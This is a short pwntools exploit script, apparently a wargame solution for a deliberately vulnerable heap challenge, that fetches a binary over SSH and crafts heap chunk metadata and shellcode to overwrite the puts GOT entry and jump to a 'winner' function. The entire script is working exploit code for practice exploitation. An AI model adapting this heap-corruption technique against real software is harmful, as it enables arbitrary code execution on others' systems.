from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
winner_addr = e.symbols['winner']
gotputs_addr = e.symbols['got.puts']
log.info('winner_addr:  %08x', winner_addr)
log.info('gotputs_addr: %08x', gotputs_addr)

p0 = 0x804c008
p1 = p0 + 0x20 + 8
p2 = p1 + 0x20 + 8
pN = p2 + 0x20 + 8

log.info('p0: %08x+8', p0-8)
log.info('p1: %08x+8', p1-8)
log.info('p2: %08x+8', p2-8)

one_swap = 0x50
assert p1 - 8 + (one_swap & 0xfffffffc) == pN - 8  # this prevents the 2nd swap

context.update(arch='i386', os='linux')
sh = asm('mov eax, 0x%08x; jmp eax' % winner_addr)
sh_addr = p1

a0 = fit({0x20: flat([-4, chr(one_swap)])})
a1 = fit({0x4: flat([sh_addr + 0xc, gotputs_addr - 8, sh])})
a2 = cyclic(0x20-1)  # doesn't matter

with s.system([args.BIN, a0, a1, a2]) as p:
    ret = p.recv()
    assert ret.startswith("that wasn't too bad now, was it? @ ")
